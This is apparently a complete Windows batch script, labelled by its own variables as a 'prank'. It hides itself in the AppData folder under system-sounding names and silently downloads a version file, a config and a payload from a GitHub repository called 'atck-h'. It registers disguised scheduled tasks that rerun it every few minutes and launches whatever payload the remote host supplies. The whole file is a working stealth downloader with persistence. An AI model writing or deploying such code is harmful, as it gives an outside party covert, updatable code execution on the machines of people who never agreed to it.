@echo off
setlocal enabledelayedexpansion

:: ============================================================
:: Configuration
:: ============================================================
set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "LOCAL_INTERVAL=%BASE%\interval.txt"
set "INSTALL_FLAG=%BASE%\installed.flag"

set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "CONFIG_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/config.txt"

set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "CONFIG=%TEMP%\config.txt"

:: Default values (if GitHub unreachable)
set "DEFAULT_INIT_DELAY=10"
set "DEFAULT_INTERVAL=5"

:: ============================================================
:: Create base folder if missing
:: ============================================================
if not exist "%BASE%" mkdir "%BASE%"

:: ============================================================
:: Ensure this script resides in BASE as updater.cmd
:: ============================================================
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: ============================================================
:: First installation? (flag absent)
:: ============================================================
if not exist "%INSTALL_FLAG%" goto FIRST_INSTALL

:: ============================================================
:: Normal execution – check for argument
:: ============================================================
if "%1"=="--first-run" goto FIRST_RUN_TRIGGERED

:: -----------------------------------------------------------------
:: RECURRING RUN (triggered by the minute-interval task)
:: -----------------------------------------------------------------

:: Download remote version and config silently
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >nul 2>&1

:: ---------- Update payload if newer version exists ----------
set "REMOTE="
if exist "%REMOTE_VER%" set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "!LOCAL!"=="!REMOTE!" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo !REMOTE! > "%LOCAL_VER%"
    )
)

:: ---------- Check if interval changed (robust config reading) ----------
set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 2 (
            set "REMOTE_INTERVAL=%%a"
        )
    )
)
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

:: Remove any accidental carriage return or leading/trailing spaces
for /f "tokens=* delims=" %%b in ("!REMOTE_INTERVAL!") do set "REMOTE_INTERVAL=%%b"

if exist "%LOCAL_INTERVAL%" (
    set /p LOCAL_INTERVAL=<"%LOCAL_INTERVAL%"
    for /f "tokens=* delims=" %%c in ("!LOCAL_INTERVAL!") do set "LOCAL_INTERVAL=%%c"
) else (
    set "LOCAL_INTERVAL="
)

if not "!LOCAL_INTERVAL!"=="!REMOTE_INTERVAL!" (
    :: Update the scheduled task with the new interval
    schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /f >nul 2>&1
    echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
)

:: ---------- Run the payload (visible) ----------
if exist "%PRANK%" start "" "%PRANK%"

goto :EOF

:: ============================================================
:: FIRST INSTALL – set up the delayed initial run
:: ============================================================
:FIRST_INSTALL

:: Download config to get initial delay and interval
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >nul 2>&1

set "INIT_DELAY="
set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 1 (
            set "INIT_DELAY=%%a"
        ) else if !line! equ 2 (
            set "REMOTE_INTERVAL=%%a"
        )
    )
)
if not defined INIT_DELAY set "INIT_DELAY=%DEFAULT_INIT_DELAY%"
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

:: Trim any unwanted characters
for /f "tokens=* delims=" %%b in ("!INIT_DELAY!") do set "INIT_DELAY=%%b"
for /f "tokens=* delims=" %%c in ("!REMOTE_INTERVAL!") do set "REMOTE_INTERVAL=%%c"

:: Store the interval locally for future comparisons
echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"

:: Calculate absolute time for the one‑time task (now + INIT_DELAY minutes)
for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('HH:mm')"') do set "START_TIME=%%i"
for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('MM/dd/yyyy')"') do set "START_DATE=%%i"

:: Create the one‑time task that will launch the updater with --first-run
schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /f >nul 2>&1

:: Mark installation as done
echo Installed > "%INSTALL_FLAG%"

goto :EOF

:: ============================================================
:: TRIGGERED BY THE INITIAL DELAY TASK (--first-run)
:: ============================================================
:FIRST_RUN_TRIGGERED

:: Download fresh config (interval may have changed during the waiting period)
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >nul 2>&1

set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 2 (
            set "REMOTE_INTERVAL=%%a"
        )
    )
)
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

:: Trim
for /f "tokens=* delims=" %%b in ("!REMOTE_INTERVAL!") do set "REMOTE_INTERVAL=%%b"

:: Store the interval locally
echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"

:: Run the payload (visible) for the first time
if exist "%PRANK%" start "" "%PRANK%"

:: Create the recurring updater task with the current interval
schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /f >nul 2>&1

:: Optionally delete the one‑time starter task (it won't run again, but clean up)
schtasks /delete /tn "SyslogStarter" /f >nul 2>&1

goto :EOF